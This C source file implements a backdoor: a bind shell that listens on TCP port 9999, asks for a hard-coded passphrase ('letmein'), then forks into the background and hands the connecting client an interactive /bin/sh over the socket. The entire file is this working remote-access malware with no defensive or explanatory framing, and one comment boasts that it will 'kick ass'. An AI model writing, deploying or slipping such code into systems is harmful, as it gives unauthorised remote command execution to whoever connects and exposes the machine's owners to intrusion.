#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>

#define PORT 9999
#define message "Enter the passphrase"
#define key  "letmein"

void executeshell(int *clientfd) {
	dup2(*clientfd, 2);
	dup2(*clientfd, 1);
	dup2(*clientfd, 0);
	execve("/bin/sh", NULL, NULL);
}

int main(int argc, char *argv[]) {
	pid_t pid;
	int servfd = 0;
	int clientfd = 0, bytes_from_client = 0;
	char recvbuf[4096] = {0};
	struct sockaddr_in serveraddr;
	struct sockaddr_in clientaddr;

	/*Create Server Socket*/
	servfd = socket(AF_INET, SOCK_STREAM, 0);
	if (servfd < 0) {
		printf("Failed to crate socket\n");
		exit(1);
	}

	/*Fill Socket Server Struct for Bind*/
	serveraddr.sin_family = AF_INET;
	serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
	serveraddr.sin_port = htons((unsigned short)PORT);

	/*Bind Server to Port*/
	if(bind(servfd, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) < 0) {
		printf("Error Bind Failed\n");
		exit(1);
	}
 
	listen(servfd, 5);
	
	printf("Waiting for Connections\n");
	clientfd = accept(servfd, NULL, NULL);

//	while(1) { //Use if you want multiple clients
		if(write(clientfd, message, strlen(message) + 1)){
			bytes_from_client = recv(clientfd, recvbuf, sizeof(recvbuf), 0);
			if(bytes_from_client > 0){ 
				if(strncmp(key, recvbuf, strlen(key)) == 0) {
					/*Go into background and kick ass*/
					pid = fork();
					if (pid < 0) 
						exit(1);
					if (pid > 0)
						exit(1);
					executeshell(&clientfd);
				}
			}
		}
//	}//While end 
	return 0;
}
